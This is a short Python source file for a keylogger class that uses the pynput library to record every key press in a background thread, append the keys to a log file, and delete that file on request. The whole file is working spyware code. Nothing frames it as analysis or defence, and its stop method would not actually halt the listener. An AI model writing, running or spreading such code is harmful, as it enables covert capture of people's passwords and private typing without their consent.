import threading
import os
from pynput.keyboard import Listener

class KeyloggerCore:
    def __init__(self):
        self.keylogger_thread = None

    def start_keylogger(self, output_file):
        self.keylogger_thread = threading.Thread(target=self.run_keylogger, args=(output_file,))
        self.keylogger_thread.start()

    def run_keylogger(self, output_file):
        def write_to_file(key):
            key_data = str(key)
            with open(output_file, 'a') as f:
                f.write(key_data)

        with Listener(on_press=write_to_file) as l:
            l.join()

    def stop_keylogger(self):
        if self.keylogger_thread and self.keylogger_thread.is_alive():
            self.keylogger_thread.join()

    def remove_key_logs(self, output_file):
        try:
            os.remove(output_file)
            print("Key logs file removed successfully.")
        except FileNotFoundError:
            print("Key logs file not found.")

# Usage example:
# keylogger_core = KeyloggerCore()
# keylogger_core.remove_key_logs("keylogs.txt")
